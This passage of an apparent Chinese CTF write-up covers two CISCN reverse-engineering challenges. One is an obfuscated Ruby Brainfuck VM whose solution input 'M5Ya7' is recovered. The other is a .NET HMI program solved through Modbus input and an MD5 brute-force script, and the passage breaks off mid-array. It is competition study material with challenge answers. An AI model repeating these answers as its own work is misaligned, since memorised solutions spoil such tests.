?<span class="symbol">___:</span>____<span class="number">_</span>[]&#125;)[]&#125;</span><br><span class="line">$_______=-&gt;<span class="number">_</span>&#123;$___=[];@___=$__[<span class="number">_</span>];_<span class="number">_</span>=__<span class="number">_</span>=___<span class="number">_</span>=$.;$____,@____=&#123;&#125;,[]</span><br><span class="line">(____<span class="number">_</span>=-&gt;&#123;</span><br><span class="line">  <span class="number">_</span>[___<span class="number">_</span>]==<span class="string">&#x27;5&#x27;</span>?(@____&lt;&lt;___<span class="number">_</span>)<span class="symbol">:</span>$.</span><br><span class="line">  <span class="number">_</span>[___<span class="number">_</span>]==<span class="string">&#x27;6&#x27;</span>?($____[@____[$-<span class="number">_</span>]]=___<span class="number">_</span>;@____=@____[$...$.-@_])<span class="symbol">:</span>$.</span><br><span class="line">  (___<span class="number">_</span>+=$_)==@___?$.<span class="symbol">:_____[]</span>&#125;)[]</span><br><span class="line">$____=$____==&#123;&#125;?&#123;&#125;<span class="symbol">:</span>@______[$____,$______[$____]]</span><br><span class="line">(_____<span class="number">_</span>=-&gt;&#123;<span class="number">_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;0&#x27;</span>?($___[__<span class="number">_</span>]<span class="params">||</span>=$.;$___[__<span class="number">_</span>]+=$_)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;1&#x27;</span>?($___[__<span class="number">_</span>]<span class="params">||</span>=$.;$___[__<span class="number">_</span>]-=$_)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;2&#x27;</span>?($___[__<span class="number">_</span>]<span class="params">||</span>=$.;$___[__<span class="number">_</span>]=STDIN.getc.ord)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;3&#x27;</span><span class="string">?(</span>__<span class="number">_</span>+=$_)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;4&#x27;</span><span class="string">?(</span>__<span class="number">_</span>-=$_)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;5&#x27;</span><span class="string">?(</span>_<span class="number">_</span>=($___[__<span class="number">_</span>]<span class="params">||</span>$.)==$.<span class="string">?$</span>___<span class="number">_</span>[_<span class="number">_</span>]<span class="symbol">:__</span>)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;6&#x27;</span><span class="string">?(</span>_<span class="number">_</span>=($___[__<span class="number">_</span>]<span class="params">||</span>$.)!=$.<span class="string">?$</span>___<span class="number">_</span>[_<span class="number">_</span>]<span class="symbol">:__</span>)<span class="symbol">:_</span>[_<span class="number">_</span>]==</span><br><span class="line"><span class="string">&#x27;7&#x27;</span>?($&gt;&lt;&lt;(<span class="string">&#x27;&#x27;</span>&lt;&lt;$___[__<span class="number">_</span>]))<span class="symbol">:</span>$.</span><br><span class="line">(_<span class="number">_</span>+=$_)==@___?<span class="symbol">_:</span>_____<span class="number">_</span>[]&#125;)[]&#125;</span><br><span class="line">$_______[<span class="string">&#x27;33516351...44516644&#x27;</span>];<span class="keyword">rescue</span> Exception;<span class="keyword">end</span> <span class="comment">#中间部分省略了</span></span><br></pre></td></tr></table></figure><p>这份脚本就很丑了，最后一长串的数字，让我自己来猜的话肯定会猜是一个虚拟机</p><p>然后一大堆 <code>?</code> 一看就是 <code>switch</code> 语句，后来细看才发现全是三元运算符，但也是 <code>switch</code> 的作用</p><p>于是将指令部分翻译成 python（只是熟悉一点而已）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    global_3[tmp_3] ||= $.</span><br><span class="line">    global_3[tmp_3] += global_1</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    global_3[tmp_3] ||= $.</span><br><span class="line">    global_3[tmp_3] -= global_1</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">    global_3[tmp_3] ||= $.</span><br><span class="line">    global_3[tmp_3] = STDIN.getc.<span class="built_in">ord</span></span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">    tmp_3 += global_1</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">    tmp_3 -= global_1</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (global_3[tmp_3] <span class="keyword">or</span> $.) == $.:</span><br><span class="line">        tmp_2 = global_4[tmp_2]</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (global_3[tmp_3] <span class="keyword">or</span> $.) != $.:</span><br><span class="line">        tmp_2 = global_4[tmp_2]</span><br><span class="line"><span class="keyword">if</span> _[tmp_2] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">    global_0&lt;&lt;(<span class="string">&#x27;&#x27;</span>.append(global_3[tmp_3]))</span><br></pre></td></tr></table></figure><p>因为是补题，所以提前知道是 brainfuck 语言，但还是尝试自己逆了一下</p><ul><li>tmp_3 是指针，操作3和4对应了指针+1 -1(&gt;和&lt;)</li><li>global_3 是指针指向的字节，操作0和1对应了字节的+1 -1(+和-)</li><li>操作2中含有获取输入，对应了获取输入操作(,)</li><li>操作7中含有&lt;&lt;，怀疑是输出，对应了输出操作(.)</li><li>5和6对应了跳转，猜测5是[，6是]</li></ul><p>之后就可以找个脚本翻译 brainfuck 了</p><p>我先用 python 将其转为了正常的 brainfuck 语言</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">finalop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">base = <span class="string">&#x27;+-,&gt;&lt;[].&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> op: <span class="comment"># 那一串数字</span></span><br><span class="line">    finalop += (base[<span class="built_in">int</span>(c)])</span><br><span class="line"><span class="built_in">print</span> (finalop)</span><br></pre></td></tr></table></figure><p>然后找了个脚本，这是核心部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((c = getc(in)) != EOF) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>: </span><br><span class="line">            <span class="comment">// fprintf(out, &quot;\t\t++c;\n&quot;); </span></span><br><span class="line">            cur++; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>: </span><br><span class="line">            <span class="comment">// fprintf(out, &quot;\t\t--c;\n&quot;); </span></span><br><span class="line">            cur--; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\t\t++a[%d];\n&quot;</span>, cur); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\t\t--a[%d];\n&quot;</span>, cur); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\t\tputchar(a[%d]);\n&quot;</span>, cur); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\t\ta[%d] = getchar();\n&quot;</span>, cur); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\twhile (a[%d]) &#123;\n&quot;</span>, cur); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>: <span class="built_in">fprintf</span>(out, <span class="string">&quot;\t&#125;\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始随便找了个脚本就运行，然后尝试去看，但后来发现很多指针位置的变化，看着很累，于是让指针的变化在内部运行，对具体数做变化的时候直接打印指针的值就可以了</p><h2 id="Brainfuck-代码阅读"><a href="#Brainfuck-代码阅读" class="headerlink" title="Brainfuck 代码阅读"></a>Brainfuck 代码阅读</h2><p>接下来就是痛苦的 Brainfuck 代码阅读环节了，虽然代码已经有了最简单的美化，但看起来还是像混淆过的汇编。</p><p>自己做的时候是一点一点美化代码，然后阅读的。但最后找到验证函数才搞明白。</p><p>所以先去最下面找到验证函数，看到最下面有两个<code>putchar</code>，猜测就是通过验证了，于是找进入的条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">2</span>] = getchar();</span><br><span class="line">       <span class="comment">// several code</span></span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">2</span>]) &#123;</span><br><span class="line"><span class="comment">// several code</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">       <span class="comment">// several code</span></span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">a[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">1</span>]) &#123;</span><br><span class="line">++a[<span class="number">2</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">--a[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// several code</span></span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">2</span>]) &#123;</span><br><span class="line"><span class="comment">// several code</span></span><br><span class="line"><span class="built_in">putchar</span>(a[<span class="number">4</span>]);</span><br><span class="line"><span class="comment">// several code</span></span><br><span class="line"><span class="built_in">putchar</span>(a[<span class="number">4</span>]);</span><br><span class="line">a[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入的条件是要 <code>a[2] &gt; 0</code>，网上看就知道需要让 <code>a[1] &gt; 0</code>，所以在编辑器里选中一下，就能找到所有 <code>a[1]</code> 出现的地方（这就体现出这种输出方法的优势了）</p><p>然后发现 <code>a[1]</code> 会在一开始赋值为 <code>1</code>，但一旦进入 <code>while(a[2])</code> 这种大循环，就会出现 <code>a[1]=0</code> 的赋值，所以我们的目标就是在进入循环前让 <code>a[2]==0</code></p><p>查看一下从 <code>getchar</code> 到 <code>while</code> 之间的代码，把重复出现的 <code>++</code> 都合并一下</p><p>这里以第一次 <code>getchar</code> 的代码为例，（剩下几次形式几乎完全一致，就是参数有点小变化而已）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">2</span>] = getchar();</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">3</span>]) &#123;</span><br><span class="line">--a[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">4</span>]) &#123;</span><br><span class="line">--a[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">4</span>]) &#123;</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">++a[<span class="number">3</span>];</span><br><span class="line">--a[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">3</span>]) &#123;</span><br><span class="line">--a[<span class="number">2</span>];</span><br><span class="line">--a[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">2</span>]) &#123;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">4</span>]) &#123;</span><br><span class="line">--a[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">5</span>]) &#123;</span><br><span class="line">--a[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">1</span>]) &#123;</span><br><span class="line">--a[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">4</span>]) &#123;</span><br><span class="line">++a[<span class="number">5</span>];</span><br><span class="line">++a[<span class="number">1</span>];</span><br><span class="line">--a[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">5</span>]) &#123;</span><br><span class="line">++a[<span class="number">4</span>];</span><br><span class="line">--a[<span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">2</span>]) &#123;</span><br><span class="line">--a[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (a[<span class="number">2</span>]) &#123;</span><br><span class="line">--a[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>美化一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">2</span>] = getchar();a[<span class="number">3</span>] = <span class="number">0</span>;a[<span class="number">4</span>] = <span class="number">7</span>;<span class="keyword">while</span> (a[<span class="number">4</span>]) &#123;a[<span class="number">3</span>] += <span class="number">11</span>--a[<span class="number">4</span>];&#125; <span class="comment">// a[3] = a[4] * 11 = 77        a[2] -= a[3]while (a[2]) &#123;        a[4] = 0;        a[5] = 0;        a[1] = 0;        a[2] = 0;&#125;a[2] = 0;</span></span><br></pre></td></tr></table></figure><p>简单地说就是会生成一个数字，然后用 <code>a[2]</code> 去减，如果结果为 <code>0</code>，就通过验证了，对所有的输入都搞一次，就能拿到五个输入字符 <code>M5Ya7</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这道题的时候，最大的问题就是没有搜索足够的资料，如果第一步想出来的话的，以比赛的时间，应该还是有机会做出来这道题的，毕竟后续的工作都是体力活，一点一点做下去应该就差不多能出来了</p><p>不过不管怎么说，补题的过程还是学到了很多东西的，比如“病毒式”混淆可以直接用输出来解，brainfuck的小型解释器怎么看，以及最后直接输出索引地址，做题经验++</p><h1 id="HMI"><a href="#HMI" class="headerlink" title="HMI"></a>HMI</h1><p>先说结论：屑题</p><p>参考了这篇博客：<a href="https://myts2.cn/2021/05/16/ciscn2021/">https://myts2.cn/2021/05/16/ciscn2021/</a></p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>用 file 命令看一眼，发现全是 .NET，直接上 dnSpy</p><p>先搜索 <code>CISCN</code> 字符串，找到最后的验证和输出</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">checked</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (!<span class="built_in">string</span>.IsNullOrEmpty(AnalogValueDisplay.combined[num4]))</span><br><span class="line">&#123;</span><br><span class="line">num4++;</span><br><span class="line"><span class="keyword">if</span> (num4 &gt; <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line">IL_1B9:</span><br><span class="line"><span class="keyword">if</span> (num3 == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> hash = AnalogValueDisplay.GetHash(<span class="built_in">string</span>.Join(<span class="string">&quot;,&quot;</span>, AnalogValueDisplay.combined));</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Booooooooooooooooom!&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (Operators.CompareString(hash.Substring(<span class="number">0</span>, <span class="number">10</span>), <span class="string">&quot;F0B278CCB9&quot;</span>, <span class="literal">false</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;CISCN&#123;&quot;</span> + hash + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">num3 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">goto</span> IL_1B9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最后需要通过一个md5验证，然后往回找 <code>combined</code> 是什么，发现是从 <code>text</code> 赋值的</p><p>而具体赋值到哪里，则是由 <code>num2</code> 决定的， <code>num2</code> 是一串 <code>41047</code> - <code>41054</code> 的字符串</p><p>比赛的时候只知道这个是一个端口，但具体是什么没搞出来，疯狂往回找引用发现找不到东西，怀疑还是需要远程往里面打数据，因此尝试搭建GRFICS的平台（队内大佬找到的），最后熬不动放弃了</p><p>参考别人的wp之后发现需要使用 Modbus Slave 往里面打数据，开始补题</p><h2 id="Modbus-Slave调试"><a href="#Modbus-Slave调试" class="headerlink" title="Modbus Slave调试"></a>Modbus Slave调试</h2><p>之前找到的 <code>401**</code> 原来就是 Modbus 的端口，所以只需要用 Modbus Slave 往相应端口添加数据就行</p><p>先直接运行找到粗略的范围（调试修改数据太慢了），目标就是让数字都变成白色</p><p>在粗查的时候就能发现小数点后有一些位置在 exe 界面是看不到的</p><p>明确范围后进 dnSpy 调试，总结出一个表格</p><div class="table-container"><table><thead><tr><th></th><th>min</th><th></th><th>max</th><th></th><th>dif</th><th>combined</th><th>i</th></tr></thead><tbody><tr><td>$41046$</td><td>$52.8016$</td><td>$17312$</td><td>$52.8992$</td><td>$17344$</td><td>$0.00305$</td><td>$0.00305$</td><td>$2$</td></tr><tr><td>$41047$</td><td>$25.0002$</td><td>$1634$</td><td>$25.092$</td><td>$1640$</td><td>$0.0153$</td><td>$0.0153$</td><td>$1$</td></tr><tr><td>$41048$</td><td>$62.10105$</td><td>$20361$</td><td>$62.19865$</td><td>$20393$</td><td>$0.00305$</td><td>$0.00305$</td><td>$0$</td></tr><tr><td>$41049$</td><td>$406.6128$</td><td>$26576$</td><td>$406.6893$</td><td>$26581$</td><td>$0.0153$</td><td>$0.0153$</td><td>$3$</td></tr><tr><td>$41050$</td><td>$54.00025$</td><td>$17705$</td><td>$54.09785$</td><td>$17737$</td><td>$0.00305$</td><td>$0.00305$</td><td>$7$</td></tr><tr><td>$41051$</td><td>$158.0031$</td><td>$10327$</td><td>$158.0949$</td><td>$10333$</td><td>$0.0153$</td><td>$0.0153$</td><td>$6$</td></tr><tr><td>$41052$</td><td>$22.0027$</td><td>$7214$</td><td>$22.09725$</td><td>$7245$</td><td>$0.00305$</td><td>$0.00305$</td><td>$4$</td></tr><tr><td>$41053$</td><td>$13.1121$</td><td>$857$</td><td>$13.1886$</td><td>$862$</td><td>$0.0153$</td><td>$0.0153$</td><td>$5$</td></tr></tbody></table></div><p>接下来在这一范围内进行爆破就好了</p><p>对范围做了个计算，我搞出来的是 2028571776，不知道为什么参考比我这个小一点</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>因为最后要算 md5，所以精度不能有问题，又因为爆破范围大概在 20 亿左右，所以速度也不能慢</p><p>于是决定先用python的Decimal来算小数，再用cpp求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="built_in">min</span> = [<span class="number">52.8016</span>, <span class="number">25.0002</span>, <span class="number">62.10105</span>, <span class="number">406.6128</span>, <span class="number">54.00025</span>, <span class="number">158.0031</span>, <span class="number">22.0027</span>, <span class="number">13.1121</span>]</span><br><span class="line"><span class="built_in">max</span> = [<span class="number">52.8992</span>, <span class="number">25.092</span>, <span class="number">62.19865</span>, <span class="number">406.6893</span>, <span class="number">54.09785</span>, <span class="number">158.0949</span>, <span class="number">22.09725</span>, <span class="number">13.1886</span>]</span><br><span class="line">dif = [<span class="number">0.00305</span>, <span class="number">0.0153</span>, <span class="number">0.00305</span>, <span class="number">0.0153</span>, <span class="number">0.00305</span>, <span class="number">0.0153</span>, <span class="number">0.00305</span>, <span class="number">0.0153</span>]</span><br><span class="line"><span class="built_in">round</span> = [<span class="number">33</span>, <span class="number">7</span>, <span class="number">33</span>, <span class="number">6</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">min</span>[i] = <span class="built_in">str</span>(<span class="built_in">min</span>[i])</span><br><span class="line">    <span class="built_in">max</span>[i] = <span class="built_in">str</span>(<span class="built_in">max</span>[i])</span><br><span class="line">    dif[i] = <span class="built_in">str</span>(dif[i])</span><br><span class="line">    res = <span class="built_in">min</span>[i]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">round</span>[i]):</span><br><span class="line">        <span class="built_in">print</span> (res, end = <span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">        res = Decimal(res) + Decimal(dif[i])</span><br><span class="line">    <span class="built_in">print</span> ()</span><br></pre></td></tr></table></figure><p>最后算出来的结尾会有0，手动去除一下就行</p><p>然后用cpp进行爆破，这里写的比较懒</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> combine[<span class="number">8</span>][<span class="number">40</span>] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;62.10105&quot;</span>, <span class="string">&quot;62.1041&quot;</span>, <span class="string">&quot;62.10715&quot;</span>, <span class="string">&quot;62.1102&quot;</span>, <span class="string">&quot;62.11325&quot;</span>, <span class="string">&quot;62.1163&quot;</span>, <span class="string">&quot;62.11935&quot;</span>, <span class="string">&quot;62.1224&quot;</span>, <span class="string">&quot;62.12545&quot;</span>, <span class="string">&quot;62.1285&quot;</span>, <span class="string">&quot;62.13155&quot;</span>, <span class="string">&quot;62.1346&quot;</span>, <span class="string">&quot;62.13765&quot;</span>, <span class="string">&quot;62.1407&quot;</span>, <span class="string">&quot;62.14375&quot;</span>, <span class="string">&quot;62.1468&quot;</span>, <span class="string">&quot;62.14985&quot;</span>, <span class="string">&quot;62.1529&quot;</span>, <span class="string">&quot;62.15595&quot;</span>, <span class="string">&quot;62.1590&quot;</span>, <span class="string">&quot;62.16205&quot;</span>, <span class="string">&quot;62.1651&quot;</span>, <span class="string">&quot;62.16815&quot;</span>, <span class="string">&quot;62.1712&quot;</span>, <span class="string">&quot;62.17425&quot;</span>, <span class="string">&quot;62.1773&quot;</span>, <span class="string">&quot;62.18035&quot;</span>, <span class="string">&quot;62.1834&quot;</span>, <span class="string">&quot;62.18645&quot;</span>, <span class="string">&quot;62.1895&quot;</span>, <span class="string">&quot;62.19255&quot;</span>, <span 